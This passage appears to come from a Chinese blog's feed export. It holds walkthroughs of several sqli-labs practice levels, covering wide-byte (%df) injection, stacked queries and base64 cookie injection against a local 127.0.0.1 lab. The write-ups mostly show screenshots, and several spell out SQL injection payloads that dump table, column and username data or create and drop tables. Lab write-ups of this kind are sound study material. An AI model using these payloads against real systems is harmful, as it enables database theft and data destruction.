<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971427957.png" alt="1584971427957"></p>
<p>查看表，将security转换成16进制数，因为这是宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971516419.png" alt="1584971516419"></p>
<p>查看users，也需要换成16进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971569225.png" alt="1584971569225"></p>
<p>查看username字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(username)from users  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971604853.png" alt="1584971604853"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十九关GET堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>查看初始界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035647060.png" alt="1585035647060"></p>
<p>加上单引号，页面只返回两个引号，说明$id没有包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035668650.png" alt="1585035668650"></p>
<p>查看一下源码，判断正确，$id没有引号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035718189.png" alt="1585035718189"></p>
<p>使用堆叠，向数据库插入表，页面返回正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用堆叠需要在 1 后面加分号分隔，说明这是两个语句，使用注释符将limit注释</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ;  create table crow like users --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035821792.png" alt="1585035821792"></p>
<p>在数据库中查看，插入成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035840392.png" alt="1585035840392"></p>
<p>删除crow 表，删除成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ;  drop table crow  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035869907.png" alt="1585035869907"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十五关GET宽字节</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<h4 id="查看初始页面。"><a href="#查看初始页面。" class="headerlink" title="查看初始页面。"></a>查看初始页面。</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981792588.png" alt="1584981792588"></p>
<h4 id="查看源码，使用了gbk编码，-id并没有引号包裹"><a href="#查看源码，使用了gbk编码，-id并没有引号包裹" class="headerlink" title="查看源码，使用了gbk编码，$id并没有引号包裹"></a>查看源码，使用了gbk编码，$id并没有引号包裹</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981816345.png" alt="1584981816345"></p>
<h4 id="查看当前字段数，字段3返回正常"><a href="#查看当前字段数，字段3返回正常" class="headerlink" title="查看当前字段数，字段3返回正常"></a>查看当前字段数，字段3返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981857891.png" alt="1584981857891"></p>
<h4 id="字段4返回错误，说明当前字段为3"><a href="#字段4返回错误，说明当前字段为3" class="headerlink" title="字段4返回错误，说明当前字段为3"></a>字段4返回错误，说明当前字段为3</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981877153.png" alt="1584981877153"></p>
<h4 id="查看注入点"><a href="#查看注入点" class="headerlink" title="查看注入点"></a>查看注入点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981919225.png" alt="1584981919225"></p>
<h4 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981940257.png" alt="1584981940257"></p>
<h4 id="查看表，因为用的是gbk编码将security改为16进制数"><a href="#查看表，因为用的是gbk编码将security改为16进制数" class="headerlink" title="查看表，因为用的是gbk编码将security改为16进制数"></a>查看表，因为用的是gbk编码将security改为16进制数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981997638.png" alt="1584981997638"></p>
<h4 id="查看users表"><a href="#查看users表" class="headerlink" title="查看users表"></a>查看users表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584982054583.png" alt="1584982054583"></p>
<h4 id="查看username字段"><a href="#查看username字段" class="headerlink" title="查看username字段"></a>查看username字段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584982086080.png" alt="1584982086080"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十八关GET堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>查看原始界面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033330923.png" alt="1585033330923"></p>
<p>使用单引号</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033352721.png" alt="1585033352721"></p>
<p>使用注释符</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033370176.png" alt="1585033370176"></p>
<p>使用堆叠，向数据库插入表，前面需要加分号分隔</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033429624.png" alt="1585033429624"></p>
<p>在mysql数据库查看数据，成功插入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033460647.png" alt="1585033460647"></p>
<p>删除表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033486636.png" alt="1585033486636"></p>
<p>查看mysql数据库，表没有了，说明语句正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585033499601.png" alt="1585033499601"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十关JSP环境联合注入</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>和29关相同只是将单引号变成了双引号</p>
<p>查看字段数，字段3返回正常，4返回错误。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962449168.png" alt="1584962449168"></p>
<p>查看注入点，注入点是2,3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962485340.png" alt="1584962485340"></p>
<p>查看但前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962518514.png" alt="1584962518514"></p>
<p>查看表名</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962584860.png" alt="1584962584860"></p>
<p>查看users表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962626835.png" alt="1584962626835"></p>
<p>查看username字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962654811.png" alt="1584962654811"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十六关GET宽字节</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<h4 id="查看源码，发现-id是单引号闭合的。"><a href="#查看源码，发现-id是单引号闭合的。" class="headerlink" title="查看源码，发现$id是单引号闭合的。"></a>查看源码，发现$id是单引号闭合的。</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016228413.png" alt="1585016228413"></p>
<h4 id="尝试单引号闭合，发现有反斜杠，说明宽字节注入"><a href="#尝试单引号闭合，发现有反斜杠，说明宽字节注入" class="headerlink" title="尝试单引号闭合，发现有反斜杠，说明宽字节注入"></a>尝试单引号闭合，发现有反斜杠，说明宽字节注入</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016405321.png" alt="1585016405321"></p>
<h4 id="加上反斜杠查看一下报错信息，返回三个反斜杠，"><a href="#加上反斜杠查看一下报错信息，返回三个反斜杠，" class="headerlink" title="加上反斜杠查看一下报错信息，返回三个反斜杠，"></a>加上反斜杠查看一下报错信息，返回三个反斜杠，</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016442312.png" alt="1585016442312"></p>
<h4 id="加上-df查看一下，页面报错，返回后面有两个引号"><a href="#加上-df查看一下，页面报错，返回后面有两个引号" class="headerlink" title="加上%df查看一下，页面报错，返回后面有两个引号"></a>加上%df查看一下，页面报错，返回后面有两个引号</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016487421.png" alt="1585016487421"></p>
<h4 id="这里用注释符注释一下，页面返回正常"><a href="#这里用注释符注释一下，页面返回正常" class="headerlink" title="这里用注释符注释一下，页面返回正常"></a>这里用注释符注释一下，页面返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016523689.png" alt="1585016523689"></p>
<h4 id="查看字段数，字段是为4的时候报错"><a href="#查看字段数，字段是为4的时候报错" class="headerlink" title="查看字段数，字段是为4的时候报错"></a>查看字段数，字段是为4的时候报错</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016546371.png" alt="1585016546371"></p>
<h4 id="查看字段数3，页面返回正确，说明当前字段数为3"><a href="#查看字段数3，页面返回正确，说明当前字段数为3" class="headerlink" title="查看字段数3，页面返回正确，说明当前字段数为3"></a>查看字段数3，页面返回正确，说明当前字段数为3</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016571410.png" alt="1585016571410"></p>
<h4 id="查看注入点，注入点为2-3"><a href="#查看注入点，注入点为2-3" class="headerlink" title="查看注入点，注入点为2,3"></a>查看注入点，注入点为2,3</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016615675.png" alt="1585016615675"></p>
<h4 id="查看当前数据库，数据库为security"><a href="#查看当前数据库，数据库为security" class="headerlink" title="查看当前数据库，数据库为security"></a>查看当前数据库，数据库为security</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585016637091.png" alt="1585016637091"></p>
<h4 id="查看表名，因为是宽字节注入，所以需要将表名使用16进制"><a href="#查看表名，因为是宽字节注入，所以需要将表名使用16进制" class="headerlink" title="查看表名，因为是宽字节注入，所以需要将表名使用16进制"></a>查看表名，因为是宽字节注入，所以需要将表名使用16进制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585017175379.png" alt="1585017175379"></p>
<h4 id="查看users表"><a href="#查看users表" class="headerlink" title="查看users表"></a>查看users表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585017335130.png" alt="1585017335130"></p>
<h4 id="查看username字段"><a href="#查看username字段" class="headerlink" title="查看username字段"></a>查看username字段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\&#39; union select 1,2,group_concat(username)from users --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585017391051.png" alt="1585017391051"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十一关cookie</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/</url>
    <content><![CDATA[<p>抓取cookie包发送的repeater模块运行，返回这种结果</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584013031.png" alt="1584584013031"></p>
<p>查看cookie值，发现是经过加密的</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584032324.png" alt="1584584032324"></p>
<p>解密工具进行解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%3D是&#x3D;等于号的意思</span><br><span class="line">YWRtaW4%3D</span><br><span class="line">将%30改为&#x3D;</span><br><span class="line">YWRtaW4&#x3D;</span><br><span class="line">解密之后发现是admin</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584103583.png" alt="1584584103583"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这样就可以在这个基础上将输入的sql语句进行加密执行</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584671580.png" alt="1584584671580"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看字段数，回显正常，正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584749973.png" alt="1584584749973"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584795279.png" alt="1584584795279"></p>
